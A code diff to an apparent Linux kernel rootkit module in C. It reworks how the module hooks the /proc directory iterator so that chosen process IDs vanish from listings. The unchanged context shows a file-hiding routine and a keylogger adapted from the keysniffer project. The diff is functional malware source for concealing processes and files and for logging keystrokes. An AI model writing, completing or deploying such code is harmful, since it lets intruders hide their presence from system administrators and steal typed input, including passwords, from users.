@@ -87,11 +87,6 @@ static struct file_operations* backup_proc_fops;
 static struct inode* proc_inode;
 struct dir_context* backup_ctx;
 
-static struct path my_file_path;
-static struct file_operations file_ops;
-static struct file_operations* backup_file_ops;
-static struct inode* my_file_inode;
-
 void consume_keys(struct work_struct* work);
 
 static const char* keylog_data;
@@ -107,6 +102,8 @@ bool hide_file(const char* user_input, struct hidden_file* hf);
 
 static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
         u64 ino, unsigned int d_type);
+static int proc_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
+        u64 ino, unsigned int d_type);
 
 //Keysniffer code modified from https://github.com/jarun/keysniffer/blob/master/keysniffer.c
 static struct notifier_block keysniffer_blk = {
@@ -114,11 +111,7 @@ static struct notifier_block keysniffer_blk = {
 };
 
 struct dir_context bad_ctx = {
-        .actor = rk_filldir_t,
-};
-
-struct dir_context file_ctx = {
-        .actor = rk_filldir_t,
+        .actor = proc_filldir_t,
 };
 
 /*
@@ -600,15 +593,6 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
     char p[64];
     int i;
 
-    for (i = 0; i < hidden_count; ++i) {
-        memset(p, 0, 64);
-        //Convert stored pid to string
-        snprintf(p, 64, "%lu", hidden_procs[i]);
-
-        if (strncmp(proc_name, p, strlen(p)) == 0) {
-            return 0;
-        }
-    }
     for (i = 0; i < hidden_file_count; ++i) {
         printk(KERN_ALERT "Checking %s against %s\n", proc_name, hidden_files[i].name);
         if (strncmp(proc_name, hidden_files[i].name, strlen(hidden_files[i].name)) == 0) {
@@ -618,11 +602,9 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
     }
     for (i = 0; i < hidden_file_count; ++i) {
         if (ctx == &hidden_files[i].bad_ctx) {
-            return hidden_files[i].backup_ctx->actor(hidden_files[i].backup_ctx, proc_name, len, off, ino, d_type);
+            return hidden_files[i].backup_ctx->actor(
+                    hidden_files[i].backup_ctx, proc_name, len, off, ino, d_type);
         }
-    }
-    if (ctx == &bad_ctx) {
-        return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
     }
     return ctx->actor(ctx, proc_name, len, off, ino, d_type);
 }
@@ -641,11 +623,33 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
             return result;
         }
     }
-    if (ctx == &bad_ctx) {
-        result = backup_proc_fops->iterate_shared(file, &bad_ctx);
-        return result;
-    }
     result = file->f_inode->i_fop->iterate_shared(file, ctx);
+    return result;
+}
+
+static int proc_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
+        u64 ino, unsigned int d_type) {
+    char p[64];
+    int i;
+
+    for (i = 0; i < hidden_count; ++i) {
+        memset(p, 0, 64);
+        //Convert stored pid to string
+        snprintf(p, 64, "%lu", hidden_procs[i]);
+
+        if (strncmp(proc_name, p, strlen(p)) == 0) {
+            return 0;
+        }
+    }
+    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
+}
+
+int proc_iterate_shared(struct file* file, struct dir_context* ctx) {
+    int result = 0;
+    bad_ctx.pos = ctx->pos;
+    backup_ctx = ctx;
+    result = backup_proc_fops->iterate_shared(file, &bad_ctx);
+    ctx->pos = bad_ctx.pos;
     return result;
 }
 
@@ -729,7 +733,7 @@ static int __init mod_init(void) {
     proc_inode = proc_path.dentry->d_inode;
     proc_fops = *proc_inode->i_fop;
     backup_proc_fops = proc_inode->i_fop;
-    proc_fops.iterate_shared = rk_iterate_shared;
+    proc_fops.iterate_shared = proc_iterate_shared;
     proc_inode->i_fop = &proc_fops;
 
     const char* user_input = "/aing-matrix";
